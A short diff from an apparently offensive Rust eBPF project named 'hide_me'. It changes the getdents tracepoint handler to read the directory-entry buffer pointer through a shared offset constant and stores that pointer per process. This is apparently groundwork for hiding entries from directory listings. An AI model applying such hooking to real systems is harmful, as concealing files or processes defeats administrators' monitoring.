@@ -10,6 +10,7 @@ use aya_ebpf::{
     programs::TracePointContext,
 };
 use aya_log_ebpf::info;
+use hide_me_common::RET;
 
 use vmlinux::vmlinux::{linux_dirent64, task_struct};
 
@@ -76,7 +77,7 @@ fn handle_getdents_enter(ctx: TracePointContext) -> Result<u32, u32> {
         "pid is {}, fd is {}, buff_count is 0x{:x}", pid, fd, buff_count
     );
 
-    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(24).unwrap() };
+    let dirp: *const linux_dirent64 = unsafe { ctx.read_at(RET as usize).unwrap() };
     map_buffs.insert(&pid_tgid, &(dirp as u64), 0).unwrap();
     info!(&ctx, "dirp is 0x{:x}", dirp as u64);
     Ok(0)
